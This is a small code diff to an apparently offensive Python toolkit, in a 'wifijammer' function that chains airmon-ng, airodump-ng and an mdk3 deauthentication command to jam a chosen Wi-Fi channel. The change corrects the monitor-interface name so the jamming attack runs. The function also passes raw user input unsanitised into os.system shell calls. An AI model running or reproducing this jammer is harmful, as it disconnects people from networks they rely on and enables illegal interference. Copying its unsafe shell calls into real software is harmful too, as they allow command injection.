@@ -129,9 +129,9 @@ def wifijammer () :
     os.system("airmon-ng")
     iface = raw_input("Enter The Preffered Interface : ")
     os.system("airmon-ng start "+iface)
-    os.system("airodump-ng "+iface)
+    os.system("airodump-ng "+iface+"mon")
     channel = raw_input("Enter The Preffered Channel You Want To Jam : ")
-    os.system("mdk3 d -c "+channel)
+    os.system("mdk3 "+iface+"mon ""d -c "+channel)
 # Choice Decide
 if choice == 1 :
     cupp()
